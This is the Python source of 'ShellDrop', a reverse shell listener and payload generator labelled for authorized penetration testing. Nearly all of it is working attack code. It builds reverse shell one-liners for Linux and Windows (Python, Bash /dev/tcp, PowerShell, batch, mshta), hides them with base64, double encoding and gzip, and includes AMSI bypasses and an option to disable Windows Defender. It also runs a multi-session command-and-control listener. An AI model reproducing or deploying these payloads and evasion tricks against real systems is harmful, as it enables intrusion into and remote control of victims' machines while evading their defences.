#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════╗
║                         ShellDrop V 1.0 beta                  ║
║  Professional Reverse Shell Listener and payload generator    ║
║                                                               ║
║ Author: unknone hart / kishwor dulal                          ║
║ Purpose: Authorized Penetration Testing & Red Team Ops        ║
╚═══════════════════════════════════════════════════════════════╝

This tool provides a robust multi-client command and control interface
with advanced payload generation and stealth features.

⚠️  FOR AUTHORIZED USE ONLY - Unauthorized use is illegal ⚠️
"""

import socket
import threading
import sys
import os
import argparse
import time
import base64
import select
import gzip
import re
import queue
from io import BytesIO

# --- ANSI Color Codes ---
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# --- Global State Management ---
clients = {}
clients_lock = threading.Lock()
current_client_id = None
client_id_counter = 0
print_lock = threading.Lock()
input_queue = queue.Queue()
last_prompt = None
last_command = ""

def safe_print(message, color=Colors.ENDC):
    """Thread-safe print function."""
    global last_prompt
    with print_lock:
        if last_prompt is not None:
            print()
            last_prompt = None
        print(f"{color}{message}{Colors.ENDC}")

def get_prompt():
    """Returns the appropriate prompt string."""
    global current_client_id
    if current_client_id is not None and current_client_id in clients:
        client_prompt = clients[current_client_id].prompt
        if client_prompt:
            match = re.search(r'([^@]+)@([^:]+):([^#$]+)', client_prompt)
            if match:
                user, host, path = match.groups()
                return f"{Colors.OKGREEN}shelldrop>@{user}@{host}:{path}$> {Colors.ENDC}"
            else:
                match = re.search(r'([^@]+)@([^#$]+)', client_prompt)
                if match:
                    user, host = match.groups()
                    return f"{Colors.OKGREEN}shelldrop>@{user}@{host}$> {Colors.ENDC}"
                else:
                    return f"{Colors.OKGREEN}shelldrop>@client{current_client_id}$> {Colors.ENDC}"
    return f"{Colors.OKCYAN}shelldrop> {Colors.ENDC}"

def redraw_prompt():
    """Redraws the prompt."""
    global last_prompt
    with print_lock:
        prompt = get_prompt()
        if prompt != last_prompt:
            if last_prompt is not None:
                print()
            sys.stdout.write(prompt)
            sys.stdout.flush()
            last_prompt = prompt

class Client:
    """Represents a connected client."""
    def __init__(self, conn, addr, client_id):
        self.conn = conn
        self.addr = addr
        self.id = client_id
        self.prompt = ""
        self.output_queue = queue.Queue()
        self.receive_thread = threading.Thread(target=self.receive_data, daemon=True)
        self.receive_thread.start()

    def receive_data(self):
        """Continuously receives data from the client."""
        buffer = ""
        while True:
            try:
                data = self.conn.recv(4096)
                if not data:
                    self.output_queue.put(("__DISCONNECT__", ""))
                    break
                decoded_data = data.decode('utf-8', errors='ignore')
                buffer += decoded_data
                
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    self.output_queue.put(("", line + '\n'))
                
                if buffer:
                    self.output_queue.put(("", buffer))
                    buffer = ""
            except (ConnectionResetError, BrokenPipeError):
                self.output_queue.put(("__DISCONNECT__", ""))
                break
            except Exception as e:
                self.output_queue.put(("error", f"[-] Error: {e}"))
                break

    def send_data(self, data):
        """Sends data to the client."""
        global last_command
        try:
            last_command = data.strip()
            self.conn.send(data.encode('utf-8'))
        except Exception:
            self.output_queue.put(("__DISCONNECT__", ""))

    def disconnect(self):
        """Closes the connection."""
        self.conn.close()

def handle_user_input():
    """Dedicated thread for user input."""
    global last_prompt
    while True:
        try:
            cmd = input()
            with print_lock:
                last_prompt = None
            input_queue.put(cmd)
        except (EOFError, KeyboardInterrupt):
            input_queue.put("exit")
            break

def get_local_ip():
    """Determines the primary non-loopback IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        if ip.startswith("127."):
            safe_print("[-] Could not determine local IP. Please specify it with -l.", Colors.FAIL)
            sys.exit(1)
        return ip

def generate_payloads(ip, port, kill_av=False):
    """Generates stealthy reverse shell payloads."""
    payloads = {}
    
    # ============ LINUX PAYLOADS ============
    
    # Raw Python - Silent mode (suppresses errors)
    raw_python_payload = f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\' 2>/dev/null'
    payloads['Linux (Python - Raw)'] = raw_python_payload
    
    # Raw Bash - Clean version
    raw_bash_payload = f'bash -c "exec bash -i &>/dev/tcp/{ip}/{port} 0>&1" 2>/dev/null'
    payloads['Linux (Bash - Raw)'] = raw_bash_payload
    
    # Core payloads for encoding
    core_python_payload = f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
    core_bash_payload = f'exec bash -i &>/dev/tcp/{ip}/{port} 0>&1'
    
    # Single Encoded Python
    encoded_python_payload = base64.b64encode(core_python_payload.encode()).decode()
    single_encoded_python_payload = f'python3 -c "import base64;exec(base64.b64decode(\'{encoded_python_payload}\'))" 2>/dev/null'
    payloads['Linux (Python - Encoded)'] = single_encoded_python_payload
    
    # Obfuscated & Backgrounded Bash - Using subshell backgrounding
    encoded_bash_payload = base64.b64encode(core_bash_payload.encode()).decode()
    backgrounded_bash_payload = f'(bash -c "eval \\"$(echo {encoded_bash_payload}|base64 -d)\\"" &) >/dev/null 2>&1'
    payloads['Linux (Bash - Obfuscated & Backgrounded)'] = backgrounded_bash_payload
    
    # Double Encoded Python (backgrounded) - Using subshell backgrounding
    def double_encode(data_string):
        first = base64.b64encode(data_string.encode('utf-8')).decode('utf-8')
        second = base64.b64encode(first.encode('utf-8')).decode('utf-8')
        return second

    double_encoded = double_encode(core_python_payload)
    backgrounded_python_payload = f'(python3 -c "import base64;exec(base64.b64decode(base64.b64decode(\'{double_encoded}\')))" &) >/dev/null 2>&1'
    payloads['Linux (Python - Double Encoded & Backgrounded)'] = backgrounded_python_payload

    # ============ WINDOWS PAYLOADS ============
    
    # Enhanced PowerShell with better evasion
    pre_commands = ""
    if kill_av:
        pre_commands = "Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -ErrorAction SilentlyContinue;"
    
    # Multi-layer AMSI bypass
    amsi_bypass_layer1 = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
    amsi_bypass_layer2 = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like '*iUtils'){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like '*Failed'){$f=$e}};$f.SetValue($null,$true);"
    
    # Core PowerShell reverse shell
    core_ps_payload = f"""
$c=New-Object Net.Sockets.TCPClient('{ip}',{port});
$s=$c.GetStream();
[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
    $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
    $r=(iex $d 2>&1|Out-String);
    $r2=$r+'PS '+(pwd).Path+'> ';
    $rb=([text.encoding]::ASCII).GetBytes($r2);
    $s.Write($rb,0,$rb.Length);
    $s.Flush()
}};
$c.Close()
""".replace('\n', '').replace('    ', '')
    
    # Compress and encode
    buffer = BytesIO()
    with gzip.GzipFile(fileobj=buffer, mode="wb") as f:
        f.write(core_ps_payload.encode('utf-8'))
    compressed = buffer.getvalue()
    encoded_compressed = base64.b64encode(compressed).decode('utf-8')
    
    # Final obfuscated PowerShell payload
    final_ps_payload = f'''powershell -nop -w hidden -ep bypass -c "try{{{amsi_bypass_layer1}}}catch{{}};try{{{amsi_bypass_layer2}}}catch{{}};{pre_commands}$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('{encoded_compressed}'));$d=(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();iex $d"'''
    
    payload_name = 'Windows (PowerShell - Enhanced Bypass)' if kill_av else 'Windows (PowerShell - AMSI Bypass)'
    payloads[payload_name] = final_ps_payload
    
    # Alternative Windows payload using IEX download cradle
    alt_ps = f'''powershell -nop -w hidden -c "$s=New-Object Net.Sockets.TCPClient('{ip}',{port});$t=$s.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$t.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$ob=([text.encoding]::ASCII).GetBytes($o2);$t.Write($ob,0,$ob.Length);$t.Flush()}};$s.Close()"'''
    payloads['Windows (PowerShell - Simple)'] = alt_ps
    
    # ============ WINDOWS PYTHON PAYLOADS ============
    
    # Python reverse shell for Windows (threading approach - Windows compatible)
    win_python_payload = f'''python -c "import socket,subprocess,os,threading,sys;s=socket.socket();s.connect(('{ip}',{port}));def r(s):    while True:        d=s.recv(1024);        if len(d)==0: break;        p=subprocess.Popen(d.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE);        o=p.stdout.read()+p.stderr.read();        s.send(o);threading.Thread(target=r,args=(s,)).start()"'''
    payloads['Windows (Python - Raw)'] = win_python_payload
    
    # Alternative: Simpler Windows Python shell
    win_python_simple = f'''python -c "import socket,subprocess;s=socket.socket();s.connect(('{ip}',{port}));[s.send(subprocess.run(s.recv(1024).decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE).stdout) for _ in iter(int,1)]"'''
    payloads['Windows (Python - Simple Loop)'] = win_python_simple
    
    # Python base64 encoded (Windows compatible - using shell execution)
    win_core_python = f'''import socket,subprocess,threading;s=socket.socket();s.connect(("{ip}",{port}));
def read_socket(sock):
    while True:
        try:
            data=sock.recv(1024)
            if not data:break
            proc=subprocess.Popen(data.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output=proc.stdout.read()+proc.stderr.read()
            sock.send(output)
        except:break
threading.Thread(target=read_socket,args=(s,)).start()'''.replace('\n','')
    
    win_encoded_python = base64.b64encode(win_core_python.encode()).decode()
    win_python_encoded_payload = f'python -c "import base64;exec(base64.b64decode(\'{win_encoded_python}\'))"'
    payloads['Windows (Python - Encoded)'] = win_python_encoded_payload
    
    # ============ WINDOWS BATCH FILE PAYLOADS ============
    
    # Create a .bat file content for download
    bat_content = f'''@echo off
set ip={ip}
set port={port}
powershell -nop -w hidden -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('%ip%',%port%);$s=$c.GetStream();[byte[]]$b=0..65535|%%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$rb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($rb,0,$rb.Length);$s.Flush()}};$c.Close()"'''
    
    bat_encoded = base64.b64encode(bat_content.encode()).decode()
    bat_instructions = f'''# Save this as shell.bat and run it:
echo {bat_encoded} | certutil -decode -f shell.bat && shell.bat

# Or create the file directly:
# 1. Open Notepad
# 2. Paste the content below
# 3. Save as "shell.bat"
# 4. Double-click to run

--- shell.bat content ---
{bat_content}
--- end of shell.bat ---'''
    
    payloads['Windows (Batch Script)'] = bat_instructions
    
    # Simple one-liner batch using mshta
    mshta_payload = f'''mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -nop -w hidden -c $c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$rb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($rb,0,$rb.Length);$s.Flush()}};$c.Close()"", 0:close")'''
    payloads['Windows (MSHTA - One-liner)'] = mshta_payload
    
    return payloads

def accept_connections(server):
    """Accepts new client connections."""
    global client_id_counter
    while True:
        try:
            server.settimeout(1)
            conn, addr = server.accept()
            with clients_lock:
                client_id_counter += 1
                client = Client(conn, addr, client_id_counter)
                clients[client_id_counter] = client
                safe_print(f"[+] New session established: {addr[0]}:{addr[1]} → Client ID: {client_id_counter}", Colors.OKGREEN)
        except socket.timeout:
            continue
        except Exception:
            break

def print_banner():
    """Prints the professional banner."""
    banner = f"""{Colors.HEADER}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║                      ShellDrop                                ║
║    Professional Reverse Shell Listener and payload generator  ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.ENDC}"""
    print(banner)
    safe_print("⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY", Colors.WARNING)
    print()

def main():
    """Main orchestration function."""
    global current_client_id, last_prompt, last_command
    
    parser = argparse.ArgumentParser(
        description="ShellDrop v.0 beta - Professional Reverse Shell Listener and payload generator ",
        epilog="Example: python3 shelldrop.py -p 4444",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-l', '--listen-ip', help="IP address to bind (auto-detected if not provided)")
    parser.add_argument('-p', '--port', type=int, required=True, help="Port to listen on")
    parser.add_argument('--kill-av', action='store_true', help="Add Windows Defender disable commands (highly detectable)")
    
    args = parser.parse_args()
    listener_ip = args.listen_ip if args.listen_ip else get_local_ip()
    port = args.port

    print_banner()
    
    if args.kill_av:
        safe_print(f"{Colors.FAIL}[!] WARNING: AV kill switch is ACTIVE (very detectable!){Colors.ENDC}\n")

    payloads = generate_payloads(listener_ip, port, kill_av=args.kill_av)
    
    safe_print(f"{Colors.OKCYAN}{Colors.BOLD}╔═══ PAYLOAD GENERATION ═══════════════════════════════════════╗{Colors.ENDC}")
    safe_print(f"{Colors.OKCYAN}║ Execute one of these commands on the target machine:        ║{Colors.ENDC}")
    safe_print(f"{Colors.OKCYAN}╚══════════════════════════════════════════════════════════════╝{Colors.ENDC}\n")
    
    for name, payload in payloads.items():
        safe_print(f"{Colors.BOLD}{Colors.OKGREEN}┌─[ {name} ]{Colors.ENDC}")
        safe_print(f"{Colors.OKBLUE}└─▸ {Colors.ENDC}{payload}\n")
    
    safe_print(f"{Colors.OKCYAN}{'─' * 66}{Colors.ENDC}\n")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((listener_ip, port))
        server.listen(5)
        safe_print(f"[✓] Listener active on {listener_ip}:{port}", Colors.OKGREEN)
        safe_print(f"[✓] Awaiting incoming connections...\n", Colors.OKGREEN)
        
        acceptor_thread = threading.Thread(target=accept_connections, args=(server,), daemon=True)
        acceptor_thread.start()

        input_handler_thread = threading.Thread(target=handle_user_input, daemon=True)
        input_handler_thread.start()

        redraw_prompt()

        while True:
            try:
                cmd = input_queue.get(timeout=0.1)
                
                if current_client_id is None:
                    if cmd.lower() == "list":
                        safe_print(f"\n{Colors.OKCYAN}╔═══ ACTIVE SESSIONS ═══════════════════════════════════════╗{Colors.ENDC}")
                        with clients_lock:
                            if not clients: 
                                safe_print(f"{Colors.WARNING}║ No active sessions{Colors.ENDC}")
                            else:
                                for cid, client in clients.items():
                                    safe_print(f"{Colors.OKGREEN}║ Session {cid:02d} │ {client.addr[0]:15s} : {client.addr[1]}{Colors.ENDC}")
                        safe_print(f"{Colors.OKCYAN}╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}\n")
                        redraw_prompt()
                    elif cmd.lower().startswith("use "):
                        try:
                            target_id = int(cmd.split(" ")[1])
                            with clients_lock:
                                if target_id in clients:
                                    current_client_id = target_id
                                    safe_print(f"[*] Interacting with Session {target_id} | Type 'background' to detach", Colors.OKGREEN)
                                    redraw_prompt()
                                else:
                                    safe_print(f"[-] Session {target_id} not found", Colors.FAIL)
                        except (ValueError, IndexError):
                            safe_print("[-] Usage: use <session_id>", Colors.FAIL)
                        redraw_prompt()
                    elif cmd.lower() in ["exit", "quit"]:
                        safe_print("\n[*] Shutting down ShellDrop...", Colors.WARNING)
                        with clients_lock:
                            for client_id in list(clients.keys()):
                                clients[client_id].disconnect()
                        server.close()
                        sys.exit(0)
                    elif cmd.lower() == "help":
                        safe_print(f"\n{Colors.OKCYAN}╔═══ AVAILABLE COMMANDS ════════════════════════════════════╗{Colors.ENDC}")
                        safe_print(f"{Colors.OKGREEN}║ list              - Show all active sessions{Colors.ENDC}")
                        safe_print(f"{Colors.OKGREEN}║ use <id>          - Interact with a session{Colors.ENDC}")
                        safe_print(f"{Colors.OKGREEN}║ background        - Return to main menu (from session){Colors.ENDC}")
                        safe_print(f"{Colors.OKGREEN}║ exit/quit         - Shutdown the listener{Colors.ENDC}")
                        safe_print(f"{Colors.OKCYAN}╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}\n")
                        redraw_prompt()
                    elif cmd:
                        safe_print("[-] Unknown command. Type 'help' for available commands", Colors.FAIL)
                        redraw_prompt()
                else:
                    if cmd.strip().lower() == "background":
                        safe_print(f"[*] Session {current_client_id} backgrounded (still active)", Colors.OKCYAN)
                        current_client_id = None
                        redraw_prompt()
                    else:
                        with clients_lock:
                            if current_client_id in clients:
                                clients[current_client_id].send_data(cmd + "\n")
                            else:
                                safe_print(f"[-] Session {current_client_id} disconnected", Colors.FAIL)
                                current_client_id = None
                                redraw_prompt()
                
                if current_client_id is None:
                    redraw_prompt()

            except queue.Empty:
                output_received = False
                with clients_lock:
                    for client_id, client in list(clients.items()):
                        try:
                            while True:
                                msg_type, data = client.output_queue.get_nowait()
                                output_received = True
                                if msg_type == "__DISCONNECT__":
                                    safe_print(f"\n[!] Session {client_id} ({client.addr[0]}) terminated", Colors.WARNING)
                                    if current_client_id == client_id:
                                        current_client_id = None
                                    del clients[client_id]
                                    redraw_prompt()
                                    break
                                
                                if msg_type == "error":
                                    safe_print(data, Colors.FAIL)
                                    redraw_prompt()
                                    continue
                                
                                # Filter out error messages
                                if "cannot set terminal process group" in data or "no job control" in data:
                                    continue
                                
                                if re.match(r'^.*@.*[#$]\s*$', data.strip()):
                                    client.prompt = data.strip()
                                    if current_client_id == client_id:
                                        redraw_prompt()
                                else:
                                    if current_client_id == client_id:
                                        if data.strip() == last_command:
                                            continue
                                        else:
                                            with print_lock:
                                                if last_prompt is not None:
                                                    print()
                                                    last_prompt = None
                                                sys.stdout.write(data)
                                                sys.stdout.flush()
                                    else:
                                        # Only show non-empty output from background sessions
                                        if data.strip():
                                            safe_print(f"[Session {client_id}] {data.rstrip()}", Colors.OKCYAN)
                        except queue.Empty:
                            pass
                
                if current_client_id is None and not output_received:
                    redraw_prompt()

    except KeyboardInterrupt:
        safe_print("\n\n[*] Shutting down ShellDrop...", Colors.WARNING)
        server.close()
        sys.exit(0)
    except Exception as e:
        safe_print(f"[-] Critical error: {e}", Colors.FAIL)
        server.close()
        sys.exit(1)

if __name__ == "__main__":
    main()
